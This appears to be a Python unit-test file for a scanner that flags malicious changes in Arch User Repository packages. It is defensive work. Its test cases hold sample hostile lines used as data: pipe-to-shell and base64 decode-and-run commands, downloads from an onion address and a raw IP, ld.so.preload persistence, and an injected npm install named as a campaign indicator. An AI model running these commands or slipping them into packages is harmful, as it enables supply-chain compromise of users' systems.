import subprocess
import tempfile
import textwrap
import unittest
from pathlib import Path
from unittest import mock

from aurguard.aur import AurPackage, Repo, commit_for_version, srcinfo_version
from aurguard.rules import check_lines, maintainer_change
from aurguard.scan import build_report, parse_diff


def rules_hit(path, line):
    return {f.rule for f in check_lines(path, [(1, line)])}


class RuleTests(unittest.TestCase):
    def test_campaign_lines(self):
        # the shapes injected in June 2026
        self.assertIn("known-ioc", rules_hit("PKGBUILD", "  npm install atomic-lockfile"))
        self.assertIn("js-package-manager", rules_hit("PKGBUILD", "  npm install atomic-lockfile"))
        self.assertIn("network-in-install-hook", rules_hit("foo.install", "  bun install js-digest >/dev/null 2>&1"))

    def test_pipe_to_shell(self):
        self.assertIn("pipe-to-shell", rules_hit("PKGBUILD", "curl -fsSL https://example.org/i.sh | sudo bash"))
        self.assertIn("pipe-to-shell", rules_hit("x.install", "wget -qO- http://x.y/z|sh"))

    def test_decode_and_run(self):
        self.assertIn("decode-and-run", rules_hit("PKGBUILD", 'echo aGVsbG8= | base64 -d | bash'))
        self.assertIn("decode-and-run", rules_hit("PKGBUILD", 'eval "$(curl -s https://x.y)"'))

    def test_hosts(self):
        self.assertIn("suspicious-host", rules_hit("PKGBUILD", 'source=("https://temp.sh/abc/payload")'))
        self.assertIn("suspicious-host", rules_hit("PKGBUILD", 'source=("http://45.13.7.2:8080/x")'))
        self.assertIn("suspicious-host", rules_hit("PKGBUILD", "curl http://olrh4mibs.onion/bin/linux -o x"))

    def test_new_host_only_when_diffing(self):
        added = [(3, 'source=("https://downloads.example.net/app-2.0.tar.gz")')]
        removed = ['source=("https://github.com/x/app/archive/1.0.tar.gz")']
        self.assertEqual({f.rule for f in check_lines("PKGBUILD", added, removed)}, {"new-host"})
        self.assertEqual(check_lines("PKGBUILD", added), [])

    def test_persistence(self):
        self.assertIn("persistence", rules_hit("x.install", "echo /usr/lib/libx.so >> /etc/ld.so.preload"))
        self.assertIn("persistence", rules_hit("x.install", "install -m644 a.service ~/.config/systemd/user/a.service"))
        # instructions printed for the user are not persistence...
        self.assertEqual(rules_hit("x.install", 'echo -e "  $ systemctl --user enable --now otd.service"'), set())
        # ...but writing with echo is
        self.assertIn("persistence", rules_hit("x.install", "echo /tmp/x.so >> /etc/ld.so.preload"))

    def test_ordinary_packaging_is_quiet(self):
        benign = [
            "pkgver=1.7.0",
            "pkgrel=2",
            'source=("https://github.com/Vencord/Vesktop/archive/v$pkgver.tar.gz")',
            "sha256sums=('9f2b9c1d0c1e6a5bcae0f0d6ab0d1e3c5b6a7d8e9f0a1b2c3d4e5f6a7b8c9d0e')",
            '  cmake -B build -DCMAKE_BUILD_TYPE=Release',
            '  install -Dm755 build/app "$pkgdir/usr/bin/app"',
            "  pnpm install --frozen-lockfile",
            "# npm install is done in prepare()",
            "post_install() { gtk-update-icon-cache -q -t -f usr/share/icons/hicolor; }",
        ]
        for line in benign:
            path = "app.install" if line.startswith("post_install") else "PKGBUILD"
            with self.subTest(line=line):
                self.assertEqual(rules_hit(path, line), set())

    def test_ioc_in_comment_still_reported(self):
        self.assertEqual(rules_hit("PKGBUILD", "# removed atomic-lockfile"), {"known-ioc"})

    def test_rules_only_on_scripts(self):
        self.assertEqual(rules_hit("README.md", "curl https://x.y/i.sh | sh"), set())

    def test_maintainer_change(self):
        self.assertIsNone(maintainer_change("a", "a"))
        self.assertEqual(maintainer_change(None, "b").rule, "adopted")
        self.assertEqual(maintainer_change("a", "b").rule, "maintainer-changed")


class ParsingTests(unittest.TestCase):
    def test_parse_diff(self):
        diff = textwrap.dedent("""\
            diff --git a/PKGBUILD b/PKGBUILD
            --- a/PKGBUILD
            +++ b/PKGBUILD
            @@ -10,3 +10,4 @@ prepare() {
               cd src
            -  make
            +  npm install foo
            +  make
               true
            diff --git a/old.install b/old.install
            --- a/old.install
            +++ /dev/null
            @@ -1 +0,0 @@
            -post_install() { :; }
            """)
        files = parse_diff(diff)
        self.assertEqual(len(files), 1)
        self.assertEqual(files[0].path, "PKGBUILD")
        self.assertEqual(files[0].added, [(11, "  npm install foo"), (12, "  make")])
        self.assertEqual(files[0].removed, ["  make"])

    def test_srcinfo_version(self):
        text = "pkgbase = vesktop\n\tpkgver = 1.7.0\n\tpkgrel = 1\n\tepoch = 1\n\npkgname = vesktop\n\tpkgrel = 9\n"
        self.assertEqual(srcinfo_version(text), "1:1.7.0-1")
        self.assertEqual(srcinfo_version("pkgbase = x\n\tpkgver = 2\n\tpkgrel = 3\n\tepoch = 0\n"), "2-3")


def git(cwd, *args):
    subprocess.run(["git", "-C", str(cwd), "-c", "user.name=t", "-c", "user.email=t@t", *args], check=True, capture_output=True)


class EndToEnd(unittest.TestCase):
    """A fake AUR repo: a clean release, then an injected npm install without a version bump."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        root = Path(self.tmp.name)
        work = root / "work"
        work.mkdir()
        git(work, "init", "-q", "-b", "master")

        def commit(pkgver, prepare, msg):
            (work / "PKGBUILD").write_text(f"pkgname=demo\npkgver={pkgver}\npkgrel=1\nprepare() {{\n{prepare}\n}}\n")
            (work / ".SRCINFO").write_text(f"pkgbase = demo\n\tpkgver = {pkgver}\n\tpkgrel = 1\n\npkgname = demo\n")
            git(work, "add", "-A")
            git(work, "commit", "-q", "-m", msg)

        commit("1.0", "  true", "1.0")
        commit("1.1", "  true", "1.1")
        commit("1.1", "  true\n  npm install atomic-lockfile", "fix build")  # same version!

        self.cache = root / "cache"
        repo = Repo(self.cache, "demo")
        repo.path.parent.mkdir(parents=True)
        subprocess.run(["git", "clone", "-q", "--bare", str(work), str(repo.path)], check=True)
        self.pkg = AurPackage("demo", "demo", "1.1-1", "someone", 1)

    def tearDown(self):
        self.tmp.cleanup()

    def report(self, installed, mode="check", st=None):
        with mock.patch.object(Repo, "sync"):
            return build_report(self.cache, "demo", installed, self.pkg, mode, st or {})

    def test_baseline_is_oldest_commit_of_installed_version(self):
        repo = Repo(self.cache, "demo")
        self.assertEqual(commit_for_version(repo, "1.1-1"), repo.commits()[1])

    def test_watch_catches_push_without_version_bump(self):
        r = self.report("1.1-1", mode="watch")
        self.assertEqual(r.commits, 1)
        self.assertEqual(r.worst, "high")
        self.assertIn("known-ioc", {f.rule for f in r.findings})

    def test_check_from_older_version(self):
        r = self.report("1.0-1")
        self.assertEqual(r.commits, 2)
        self.assertIn("js-package-manager", {f.rule for f in r.findings})

    def test_check_skips_up_to_date(self):
        self.pkg.version = "1.0-1"
        self.assertEqual(self.report("1.0-1").compared, "up to date")

    def test_audit_scans_all_files(self):
        r = self.report("1.1-1", mode="audit")
        self.assertIsNone(r.old_rev)
        self.assertIn("known-ioc", {f.rule for f in r.findings})


if __name__ == "__main__":
    unittest.main()
